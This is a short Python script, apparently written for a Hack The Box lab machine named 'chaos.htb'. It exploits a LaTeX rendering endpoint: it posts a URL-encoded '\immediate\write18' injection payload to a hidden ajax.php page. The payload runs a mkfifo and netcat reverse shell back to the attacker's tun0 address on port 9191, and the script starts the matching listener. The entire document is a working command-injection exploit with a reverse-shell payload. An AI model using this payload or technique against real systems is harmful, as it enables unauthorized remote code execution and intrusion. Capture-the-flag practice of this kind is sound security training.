#!/usr/bin/python
import netifaces as ni
import subprocess
import requests

def request(ip):
	data = 'content=%5Cimmediate%5Cwrite18%7Brm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+{}+9191+%3E%2Ftmp%2Ff%7D&template=test2'.format(ip)
	requests.post('http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php', data=data, headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})

if __name__ == '__main__':
	try:
		ni.ifaddresses('tun0')
		ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
		print ip
		subprocess.Popen(["nc -lvnp 9191"], shell=True, stderr=subprocess.STDOUT)
		request(ip)
	except:
		pass
